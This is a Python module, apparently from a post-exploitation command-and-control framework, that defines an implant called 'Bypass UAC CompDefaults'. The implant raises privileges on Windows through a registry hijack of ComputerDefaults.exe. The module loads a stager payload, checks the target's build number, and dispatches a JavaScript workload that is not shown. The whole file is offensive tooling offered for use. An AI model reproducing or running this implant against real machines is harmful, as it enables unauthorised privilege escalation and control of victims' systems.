import core.job
import core.implant
import uuid

class CompDefaultsJob(core.job.Job):
    def create(self):
        id = self.options.get("STAGER")
        payload = self.load_payload(id)
        self.options.set("STAGER_DATA", payload)
        if self.session_id == -1:
            return
        if int(self.session.build) < 10240 and self.options.get("IGNOREBUILD") == "false":
            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vulnerable.", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed!"
        #self.shell.print_plain(self.data)

class CompDefaultImplant(core.implant.Implant):

    NAME = "Bypass UAC CompDefaults"
    DESCRIPTION = "Bypass UAC via registry hijack for ComputerDefaults.exe. Drops no files to disk."
    AUTHORS = ['Entynetproject']
    STATE = "implant/elevate/bypassuac_compdefaults"

    def load(self):
        self.options.register("STAGER", "", "Run stagers for a list of IDs.")
        self.options.register("STAGER_DATA", "", "The actual data.", hidden=True)

    def job(self):
        return CompDefaultsJob

    def run(self):
        id = self.options.get("STAGER")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("No such stager: %s" % id)
            return False

        workloads = {}
        workloads["js"] = "data/implant/elevate/bypassuac_compdefaults.js"

        self.dispatch(workloads, self.job)
